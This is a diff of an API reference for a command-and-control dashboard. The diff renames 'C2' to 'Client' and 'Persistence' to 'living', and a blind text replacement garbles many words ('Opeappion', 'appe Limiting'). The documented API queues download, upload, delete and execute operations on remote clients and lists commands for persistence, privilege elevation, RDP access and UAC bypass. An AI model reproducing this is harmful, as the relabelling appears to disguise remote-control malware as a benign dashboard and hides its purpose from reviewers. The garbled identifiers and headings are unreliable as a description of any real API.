@@ -1,4 +1,4 @@
-# C2 Dashboard - API Reference
+# Client  Dashboard - API Reference
 
 ## Base URL
 ```
@@ -302,9 +302,9 @@ GET /system/{id}/metrics?type=latest&hours=24
 
 ## Files API
 
-### Create File Operation
+### Create File Opeappion
 ```http
-POST /files/operations
+POST /files/opeappions
 Content-Type: application/json
 
 {
@@ -314,18 +314,18 @@ Content-Type: application/json
   "file_name": "file.txt",
   "file_size": 1024,
   "file_type": "txt",
-  "operation": "download",
+  "opeappion": "download",
   "local_path": "/tmp/file.txt"
 }
 ```
-**Operation Values:** download, upload, delete, execute
+**Opeappion Values:** download, upload, delete, execute
 
 **Response:**
 ```json
 {
   "success": true,
   "data": {
-    "file_operation": {
+    "file_opeappion": {
       "id": "uuid",
       "status": "pending"
     }
@@ -333,13 +333,13 @@ Content-Type: application/json
 }
 ```
 
-### List File Operations
+### List File Opeappions
 ```http
-GET /files/list?client_id={id}&operation={op}&status={status}&limit=100
+GET /files/list?client_id={id}&opeappion={op}&status={status}&limit=100
 ```
 **Query Parameters:**
 - `client_id` (optional) - Filter by client
-- `operation` (optional) - Filter by operation type
+- `opeappion` (optional) - Filter by opeappion type
 - `status` (optional) - Filter by status
 - `limit` (optional) - Result limit (default: 100)
 
@@ -350,10 +350,10 @@ GET /files/list?client_id={id}&operation={op}&status={status}&limit=100
   "data": {
     "files": [...],
     "stats": {
-      "totalOperations": 50,
-      "completedOperations": 45,
-      "failedOperations": 2,
-      "pendingOperations": 3,
+      "totalOpeappions": 50,
+      "completedOpeappions": 45,
+      "failedOpeappions": 2,
+      "pendingOpeappions": 3,
       "totalSize": 52428800
     },
     "total": 20
@@ -361,7 +361,7 @@ GET /files/list?client_id={id}&operation={op}&status={status}&limit=100
 }
 ```
 
-### Get File Operation Status
+### Get File Opeappion Status
 ```http
 GET /files/{id}/status
 ```
@@ -370,7 +370,7 @@ GET /files/{id}/status
 {
   "success": true,
   "data": {
-    "file_operation": {
+    "file_opeappion": {
       "id": "uuid",
       "status": "completed",
       "file_size": 1024,
@@ -380,7 +380,7 @@ GET /files/{id}/status
 }
 ```
 
-### Update File Operation Status
+### Update File Opeappion Status
 ```http
 POST /files/{id}/status
 Content-Type: application/json
@@ -398,7 +398,7 @@ Content-Type: application/json
 ```json
 {
   "success": true,
-  "message": "File operation status updated to completed"
+  "message": "File opeappion status updated to completed"
 }
 ```
 
@@ -430,10 +430,10 @@ GET /dashboard/overview
         "total": 54
       },
       "files": {
-        "totalOperations": 20,
-        "completedOperations": 18,
-        "failedOperations": 1,
-        "pendingOperations": 1,
+        "totalOpeappions": 20,
+        "completedOpeappions": 18,
+        "failedOpeappions": 1,
+        "pendingOpeappions": 1,
         "totalSize": 10485760
       },
       "sessions": {
@@ -619,8 +619,8 @@ Content-Type: application/json
 - `netstat` - Network statistics
 - `arp_table` - ARP table
 
-### Persistence Commands
-- `enable_persistence` - Enable persistence
+### living Commands
+- `enable_living` - Enable living
 - `elevate` - Elevate privileges
 - `rdp` - RDP access
 - `uac_bypass` - UAC bypass
@@ -648,8 +648,8 @@ Database connection failed
 
 ---
 
-## Rate Limiting
-Currently no rate limiting. Consider adding for production.
+## appe Limiting
+Currently no appe limiting. Consider adding for production.
 
 ## Authentication
 Currently no authentication. Consider adding JWT for production.
